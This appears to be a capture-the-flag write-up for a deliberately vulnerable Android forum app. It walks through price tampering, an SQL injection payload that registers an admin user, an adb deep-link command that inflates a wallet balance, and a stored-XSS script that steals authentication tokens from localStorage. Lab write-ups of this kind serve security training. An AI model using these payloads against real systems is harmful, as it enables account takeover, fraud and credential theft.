# 🔓 Gain access to a "premium" article without paying(almost).

### 1\. The Vulnerability

- **Type:** **Client-Side Business Logic Flaw & Broken Access Control**
    
- **Description:** The application's price calculation is performed on the client (frontend), which is trusted by the server. This allows a user to modify the article's price (e.g., to 1 VulnDollar) before "purchasing." Upon this "purchase," the server issues a premium **`x-access-key`** that is accepted globally by all premium API endpoints, without subsequent verification of the original payment's legitimacy.
    
- **MASTG Mapping:**
    
    - **MASTG-AUTH-0004:** Authorization checks are not correctly enforced on the remote endpoint.
        
    - **MASTG-CODE-0004:** Inadequate hardening against client-side tampering (price manipulation).
        

### 2\. Tools Required

- Proxy tool (e.g., **Burp Suite** or OWASP ZAP)
    
- Reverse engineering tools (e.g., Jadx, to confirm price calculation location)
    

### 3\. Solution Walkthrough

1.  **Tamper with Client Logic:**
    
    - Log into the application.
        
    - Using reverse engineering tools, identify the code responsible for displaying or calculating the premium article's price.
        
    - Modify the logic to enforce a minimal price for the article (e.g., **1 VulnDollar**) instead of the actual premium price.
        
2.  **Execute Fictitious Purchase:**
    
    - Proceed with the "purchase" of the premium article at the manipulated low price.
3.  **Capture and Exploit the Access Key:**
    
    - **Intercept Traffic:** Monitor the network requests using your proxy tool (Burp Suite).
        
    - **Identify Key:** Locate the API response that confirms the purchase and contains the newly granted global **`x-access-key`**.
        
    - **Global Bypass:** The attacker can now inject this `x-access-key` into the headers of any subsequent requests to premium article endpoints, successfully bypassing the premium paywall for **all** content. The API fails to verify if the key was acquired legitimately.
        

&nbsp;

*Manipulate Price and "Purchase" the Article:*

<img src="../assets/8488b955b9e1d5fcefd74314490c3257.png" alt="8488b955b9e1d5fcefd74314490c3257.png" width="891" height="312" class="jop-noMdConv">

*Capture the Key*

*Ensure the request includes the compromised **`x-access-key`** in the header or body. The server accepts this key as valid proof of premium access for all subsequent requests, granting unauthorized access to all premium content*

![e58102258096a6229f6dbedc73eaf4ce.png](../assets/e58102258096a6229f6dbedc73eaf4ce.png)

# 🛡️ Elevate privileges to Administrator status.

### 1\. The Vulnerability

- **Type:** **SQL Injection (SQLi) via Registration Form**
    
- **Description:** The application's user registration endpoint uses an improperly sanitized SQL query, likely relying on string concatenation to insert user-provided data. This allows an attacker to inject SQL commands to modify the data being inserted, specifically the role or privilege level, bypassing intended application logic.
    
- **MASTG Mapping:** **MASTG-API-0001** (All input from the mobile app is validated and sanitized on the server side).
    

### 2\. Tools Required

- Proxy tool (e.g., **Burp Suite** or OWASP ZAP)

### 3\. Solution Walkthrough

1.  **Analyze Registration:** Use a proxy tool to intercept the request made when submitting the standard user registration form.
    
2.  **Test for SQLi:** Systematically test different input fields (e.g., `username`) for common SQL Injection weaknesses by injecting single quotes (`'`) and observing server error responses or behavioral changes.
    
3.  **Refine the Payload:** Based on the server's response, craft a **UNION** or **stacked query** that closes the initial string, injects the desired admin-level values, and comments out the rest of the original query.
    
4.  **Final Execution:** Apply the final, successful payload to the registration field (e.g., the `username` field).
    

**Successful Payload (Example):**

The following string is entered into the vulnerable registration field to terminate the original query and inject a user with the `admin` role:

```
attacker', 'password', 'admin', 100) /*
```

This payload effectively changes the SQL query from inserting a standard user to inserting a user with the hardcoded role of `admin`. After execution, the attacker is able to log in with administrative privileges.

![d72d8664aa73b0d303bf9aeec2964a7a.png](../assets/d72d8664aa73b0d303bf9aeec2964a7a.png)

<img src="../assets/389b2f35e7c08a2a0cc445e242360754.png" alt="389b2f35e7c08a2a0cc445e242360754.png" width="503" height="970">

&nbsp;

# 💰 Increase the wallet balance to 100,000 (Business Logic Flaw).

### 1\. The Vulnerability

- **Type:** **Insecure Deep Link / Exported Component (Unprotected Internal Logic)**
    
- **Description:** The application registers a Deep Link scheme (`vulnforum://`) that maps to an Activity or Composable function designed to handle internal actions, such as adding funds. The handler function **fails to validate the caller's identity** and **lacks proper authorization checks** to ensure the requested `amount` parameter is coming from a trusted source (e.g., a secure, authenticated API response) rather than an external, unverified source like a third-party application or the `adb shell`.
    
- **MASTG Mapping:**
    
    - **MASTG-IPC-0004:** The app protects exported components from unauthorized invocation. (Deeplink is essentially an entry point.)
        
    - **MASTG-AUTH-0005:** The remote endpoint verifies that the user is authorized to perform the requested action. (Although invoked locally, the action has financial/authorization implications that should be guarded.)
        
    - **MASTG-CODE-0003:** Sensitive functions (like financial transactions) implement strong authorization and integrity checks.
        

### 2\. Tools Required

- Android Debug Bridge (**ADB**)

### 3\. Solution Walkthrough

1.  **Analyze Deep Links:** Reverse engineer the application (or inspect `AndroidManifest.xml`) to identify registered URI schemes and paths, such as `vulnforum://addFunds`.
    
2.  **Identify Parameter:** Determine which parameters are accepted by the target handler (in this case, `amount`).
    
3.  **Construct Malicious Intent:** Use ADB to manually construct and send an Intent that calls the vulnerable Deeplink, injecting the desired value for the financial transaction.
    
4.  **Final Execution:** Execute the command via ADB shell:
    

&nbsp;

`adb shell am start -a android.intent.action.VIEW -d "vulnforum://addFunds?amount=100000" com.vulnforum`

<img src="../assets/718b03d41e33d1fb85feda4d40f50113.png" alt="718b03d41e33d1fb85feda4d40f50113.png" width="453" height="947">

# 🕵️‍♂️ Read or intercept other users authentication tokens.

&nbsp;

### 1\. The Vulnerability

- **Type:** **Stored Cross-Site Scripting (XSS)**
    
- **Description:** The application's comment functionality fails to adequately sanitize user input before rendering it to other users. This allows an attacker to embed malicious HTML/JavaScript (the provided payload) into a comment. When a victim views the affected comment, the script executes in their context, bypassing security measures to steal sensitive local data (the authentication token).
    
- **MASTG Mapping:**
    
    - **MASTG-API-0001:** All data and parameters are validated and sanitized on the server side. (The server failed to sanitize the comment body.)
        
    - **MASTG-CODE-0003:** Sensitive functions (like viewing article comments) should prevent the execution of untrusted code.
        

### 2\. Tools Required

- Web Browser or the Mobile App (for posting the comment)
    
- Network Monitoring (e.g., **Burp Suite** or checking the backend logs for the token)
    

### 3\. Solution Walkthrough

1.  **Craft Malicious Payload:** Construct a JavaScript payload designed to steal data. The provided script attempts to retrieve the user's token from `localStorage` and sends it to the server in a new comment, effectively leaking the token back to the attacker (assuming the attacker can read the comments).

`<script> var token = localStorage.getItem('token'); if (token) { var xhr = new XMLHttpRequest(); var formData = new FormData(); formData.append('text', token); formData.append('article_id', '1'); // This sends the victim's token back to the server as a new comment xhr.open('POST', 'http://127.0.0.1:5000/api/articles/1/comments'); xhr.send(formData); } </script>`

1.  **Inject Payload:** Post the malicious script as a new comment on an article (e.g., Article ID 1).
2.  **Exploitation:** Wait for a victim user (e.g., an Administrator or another logged-in user) to view the infected article.
3.  **Token Theft:** When the victim views the comment, the script executes, extracts their authentication token, and sends it as the body of a new comment (or to an attacker-controlled endpoint).
4.  **Impersonation:** The attacker retrieves the stolen token and can then use it (e.g., via Burp Repeater) to send requests on behalf of the victim, achieving impersonation (which fulfills the **Impersonation** challenge)

&nbsp;

*Creating a comment*

![28905b8670e725b725819c69e2e382d7.png](../assets/28905b8670e725b725819c69e2e382d7.png)

*Another user checks the comments*

![e468a8b4bbcb9c45e313ec5a860b530d.png](../assets/e468a8b4bbcb9c45e313ec5a860b530d.png)

*publishing token via stored xss*

![28b777b04581b5a75c2640cd55c08062.png](../assets/28b777b04581b5a75c2640cd55c08062.png)
